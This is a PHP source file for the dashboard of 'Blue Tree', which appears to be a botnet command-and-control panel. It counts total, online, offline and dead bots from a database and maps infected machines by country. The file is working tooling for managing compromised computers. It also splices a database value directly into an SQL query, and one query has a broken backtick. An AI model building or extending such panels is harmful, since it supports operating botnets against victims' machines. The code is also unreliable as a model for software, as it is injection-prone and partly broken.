<?php
include_once("config.php");

		if($sth = $db->prepare("SELECT DISTINCT country FROM bots")){
			$sth->execute();
			$names = '{"BD": "Bangladesh", "BE": "Belgium", "BF": "Burkina Faso", "BG": "Bulgaria", "BA": "Bosnia and Herzegovina", "BB": "Barbados", "WF": "Wallis and Futuna", "BL": "Saint Barthelemy", "BM": "Bermuda", "BN": "Brunei", "BO": "Bolivia", "BH": "Bahrain", "BI": "Burundi", "BJ": "Benin", "BT": "Bhutan", "JM": "Jamaica", "BV": "Bouvet Island", "BW": "Botswana", "WS": "Samoa", "BQ": "Bonaire, Saint Eustatius and Saba ", "BR": "Brazil", "BS": "Bahamas", "JE": "Jersey", "BY": "Belarus", "BZ": "Belize", "RU": "Russia", "RW": "Rwanda", "RS": "Serbia", "TL": "East Timor", "RE": "Reunion", "TM": "Turkmenistan", "TJ": "Tajikistan", "RO": "Romania", "TK": "Tokelau", "GW": "Guinea-Bissau", "GU": "Guam", "GT": "Guatemala", "GS": "South Georgia and the South Sandwich Islands", "GR": "Greece", "GQ": "Equatorial Guinea", "GP": "Guadeloupe", "JP": "Japan", "GY": "Guyana", "GG": "Guernsey", "GF": "French Guiana", "GE": "Georgia", "GD": "Grenada", "GB": "United Kingdom", "GA": "Gabon", "SV": "El Salvador", "GN": "Guinea", "GM": "Gambia", "GL": "Greenland", "GI": "Gibraltar", "GH": "Ghana", "OM": "Oman", "TN": "Tunisia", "JO": "Jordan", "HR": "Croatia", "HT": "Haiti", "HU": "Hungary", "HK": "Hong Kong", "HN": "Honduras", "HM": "Heard Island and McDonald Islands", "VE": "Venezuela", "PR": "Puerto Rico", "PS": "Palestinian Territory", "PW": "Palau", "PT": "Portugal", "SJ": "Svalbard and Jan Mayen", "PY": "Paraguay", "IQ": "Iraq", "PA": "Panama", "PF": "French Polynesia", "PG": "Papua New Guinea", "PE": "Peru", "PK": "Pakistan", "PH": "Philippines", "PN": "Pitcairn", "PL": "Poland", "PM": "Saint Pierre and Miquelon", "ZM": "Zambia", "EH": "Western Sahara", "EE": "Estonia", "EG": "Egypt", "ZA": "South Africa", "EC": "Ecuador", "IT": "Italy", "VN": "Vietnam", "SB": "Solomon Islands", "ET": "Ethiopia", "SO": "Somalia", "ZW": "Zimbabwe", "SA": "Saudi Arabia", "ES": "Spain", "ER": "Eritrea", "ME": "Montenegro", "MD": "Moldova", "MG": "Madagascar", "MF": "Saint Martin", "MA": "Morocco", "MC": "Monaco", "UZ": "Uzbekistan", "MM": "Myanmar", "ML": "Mali", "MO": "Macao", "MN": "Mongolia", "MH": "Marshall Islands", "MK": "Macedonia", "MU": "Mauritius", "MT": "Malta", "MW": "Malawi", "MV": "Maldives", "MQ": "Martinique", "MP": "Northern Mariana Islands", "MS": "Montserrat", "MR": "Mauritania", "IM": "Isle of Man", "UG": "Uganda", "TZ": "Tanzania", "MY": "Malaysia", "MX": "Mexico", "IL": "Israel", "FR": "France", "IO": "British Indian Ocean Territory", "SH": "Saint Helena", "FI": "Finland", "FJ": "Fiji", "FK": "Falkland Islands", "FM": "Micronesia", "FO": "Faroe Islands", "NI": "Nicaragua", "NL": "Netherlands", "NO": "Norway", "NA": "Namibia", "VU": "Vanuatu", "NC": "New Caledonia", "NE": "Niger", "NF": "Norfolk Island", "NG": "Nigeria", "NZ": "New Zealand", "NP": "Nepal", "NR": "Nauru", "NU": "Niue", "CK": "Cook Islands", "XK": "Kosovo", "CI": "Ivory Coast", "CH": "Switzerland", "CO": "Colombia", "CN": "China", "CM": "Cameroon", "CL": "Chile", "CC": "Cocos Islands", "CA": "Canada", "CG": "Republic of the Congo", "CF": "Central African Republic", "CD": "Democratic Republic of the Congo", "CZ": "Czech Republic", "CY": "Cyprus", "CX": "Christmas Island", "CR": "Costa Rica", "CW": "Curacao", "CV": "Cape Verde", "CU": "Cuba", "SZ": "Swaziland", "SY": "Syria", "SX": "Sint Maarten", "KG": "Kyrgyzstan", "KE": "Kenya", "SS": "South Sudan", "SR": "Suriname", "KI": "Kiribati", "KH": "Cambodia", "KN": "Saint Kitts and Nevis", "KM": "Comoros", "ST": "Sao Tome and Principe", "SK": "Slovakia", "KR": "South Korea", "SI": "Slovenia", "KP": "North Korea", "KW": "Kuwait", "SN": "Senegal", "SM": "San Marino", "SL": "Sierra Leone", "SC": "Seychelles", "KZ": "Kazakhstan", "KY": "Cayman Islands", "SG": "Singapore", "SE": "Sweden", "SD": "Sudan", "DO": "Dominican Republic", "DM": "Dominica", "DJ": "Djibouti", "DK": "Denmark", "VG": "British Virgin Islands", "DE": "Germany", "YE": "Yemen", "DZ": "Algeria", "US": "United States", "UY": "Uruguay", "YT": "Mayotte", "UM": "United States Minor Outlying Islands", "LB": "Lebanon", "LC": "Saint Lucia", "LA": "Laos", "TV": "Tuvalu", "TW": "Taiwan", "TT": "Trinidad and Tobago", "TR": "Turkey", "LK": "Sri Lanka", "LI": "Liechtenstein", "LV": "Latvia", "TO": "Tonga", "LT": "Lithuania", "LU": "Luxembourg", "LR": "Liberia", "LS": "Lesotho", "TH": "Thailand", "TF": "French Southern Territories", "TG": "Togo", "TD": "Chad", "TC": "Turks and Caicos Islands", "LY": "Libya", "VA": "Vatican", "VC": "Saint Vincent and the Grenadines", "AE": "United Arab Emirates", "AD": "Andorra", "AG": "Antigua and Barbuda", "AF": "Afghanistan", "AI": "Anguilla", "VI": "U.S. Virgin Islands", "IS": "Iceland", "IR": "Iran", "AM": "Armenia", "AL": "Albania", "AO": "Angola", "AQ": "Antarctica", "AS": "American Samoa", "AR": "Argentina", "AU": "Australia", "AT": "Austria", "AW": "Aruba", "IN": "India", "AX": "Aland Islands", "AZ": "Azerbaijan", "IE": "Ireland", "ID": "Indonesia", "UA": "Ukraine", "QA": "Qatar", "MZ": "Mozambique"}';
			$names = json_decode($names, true);
		
			$country_list = array();
			$country_result = array();
			while( $row = $sth->fetch(PDO::FETCH_ASSOC) ) {
				$country_list[] = $row["country"];
			}
	
			foreach($country_list as $key => $value){
				if($sth = $db->prepare("SELECT * FROM bots WHERE country='$value'")){
				$sth->execute();	
				$num = $sth->rowCount();
			
				$country_result[$value] = $num;
				}
			}
		}
		$country_result = json_encode($country_result, true);

$online_bots_query = "SELECT * FROM `bots` WHERE `last_seen` >= date_sub(NOW(), interval 10 minute);";
$total_bots_query = "SELECT * FROM `bots`";
$offline_bots_query = "SELECT * FROM `bots` WHERE `last_seen` < date_sub(NOW(), interval 10 minute);";
$dead_bots_query = "SELECT * FROM `bots WHERE `last_seen` < date_sub(NOW(), interval 30 day);";
$online_bots = "";
$total_bots = "";
$offline_bots = "";
$dead_bots = "";

if($sth = $db->prepare($online_bots_query)){
	$sth->execute();
	$online_bots = $sth->rowCount();
}

if($sth = $db->prepare($total_bots_query)){
	$sth->execute();
	$total_bots = $sth->rowCount();
}

if($sth = $db->prepare($offline_bots_query)){
	$sth->execute();
	$offline_bots = $sth->rowCount();
}
if($sth = $db->prepare($dead_bots_query)){
	$sth->execute();
	$dead_bots = $sth->rowCount();
}
	
?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <title>Blue Tree - Dashboard</title>
	<link rel="stylesheet" href="assets/vendor_components/bootstrap/dist/css/bootstrap.css">
	<link rel="stylesheet" href="css/bootstrap-extend.css">
	<link rel="stylesheet" href="css/master_style.css">
	<link rel="stylesheet" href="css/skins/_all-skins.css">
    <link href="assets/vendor_components/jvectormap/lib2/jquery-jvectormap-2.0.2.css" rel="stylesheet" />
	<!--[if lt IE 9]>
	<script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
	<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
	<![endif]-->

     
  </head>

<body class="hold-transition skin-blue sidebar-mini">
<div class="wrapper">

  <header class="main-header">
    <a href="index.php" class="logo">
      
	  <b class="logo-lg">
		  <span ><p> Blue Tree </p>
	  </b>
    </a>
  </header>
  
  <?php

include_once("sidebar.php");
?>

  <div class="content-wrapper">
    <section class="content-header">
      <h1>
        Blue Tree
        <small>Dashboard</small>
      </h1>
    </section>

    <section class="content">
	  <div class="row">
        <div class="col-xl-3 col-md-6 col-12">
          	<div class="box box-body">
              <h6 class="text-uppercase">Total Bots</h6>
              <div class="flexbox mt-2">
                <span class=" font-size-30"><?php echo $total_bots; ?></span>
              </div>
            </div>
        </div>
        <div class="col-xl-3 col-md-6 col-12">
          	<div class="box box-body">
              <h6 class="text-uppercase">Online Bots</h6>
              <div class="flexbox mt-2">
                <span class=" font-size-30"><?php echo $online_bots; ?></span>
              </div>
            </div>
        </div>
	
        <div class="col-xl-3 col-md-6 col-12">
          	<div class="box box-body">
              <h6 class="text-uppercase">Offline Bots</h6>
              <div class="flexbox mt-2">
                <span class=" font-size-30"><?php echo $offline_bots; ?></span>
              </div>
            </div>
        </div>
        <div class="col-xl-3 col-md-6 col-12">
          	<div class="box box-body">
              <h6 class="text-uppercase">Dead Bots</h6>
              <div class="flexbox mt-2">
                <span class=" font-size-30"><?php echo $dead_bots; ?></span>
              </div>
            </div>
        </div>
      </div>

	<div class="row">
		<div class="col-12">
			<div class="box">
				<div class="box-header with-border">
					<h3 class="box-title">Bot Map</h3>
				</div>
				<div class="box-body">

					<div id="world-map" style="height: 400px"></div>

				</div>
            
			</div>
		</div>
	</div>
	  
    </section>
  </div>
  <footer class="main-footer">
	<center><b><u>Blue Tree</u></b></center>
  </footer>
  <div class="control-sidebar-bg"></div>
  
</div>

	<script src="assets/vendor_components/jquery/dist/jquery.js"></script>
	<script src="assets/vendor_components/jquery-ui/jquery-ui.js"></script>
	<script src="assets/vendor_components/popper/dist/popper.min.js"></script>
	<script src="assets/vendor_components/bootstrap/dist/js/bootstrap.js"></script>	
	<script src="assets/vendor_components/jquery-slimscroll/jquery.slimscroll.js"></script>
	<script src="assets/vendor_components/fastclick/lib/fastclick.js"></script>
	<script src="assets/vendor_components/jquery.peity/jquery.peity.js"></script>
	<script src="assets/vendor_components/raphael/raphael.min.js"></script>
	<script src="assets/vendor_components/jvectormap/lib2/jquery-jvectormap-2.0.2.min.js"></script>
    <script src="assets/vendor_components/jvectormap/lib2/jquery-jvectormap-world-mill-en.js"></script>
    <script src="assets/vendor_components/jvectormap/lib2/jquery-jvectormap-us-aea-en.js"></script>
	<script src="js/template.js"></script>
	<script type="text/javascript">
	$(function(){
		
		<?php echo "var json_test = jQuery.parseJSON('$country_result');";?>
		
		$('#world-map').vectorMap({
			map: 'world_mill_en',
		backgroundColor: '#fff',
		borderColor: '#818181',
		borderOpacity: 0.25,
		borderWidth: 1,
		color: '#f4f3f0',
		regionStyle : {
			initial : {
			fill : '#3c535d'
			}
		},
		enableZoom: true,
		hoverColor: '#28373e',
		hoverOpacity: null,
		normalizeFunction: 'linear',
		scaleColors: ['#28373e', '#28373e'],
		selectedColor: '#28373e',
		showTooltip: true,
			onRegionTipShow: function(e, el, code){
				var amount = 0;
				if(json_test[code]){
					amount = json_test[code];
				}	
				el.html(el.html()+' (Bots: '+ amount +')');
			}
			});
		});

	</script>
	
</body>
</html>
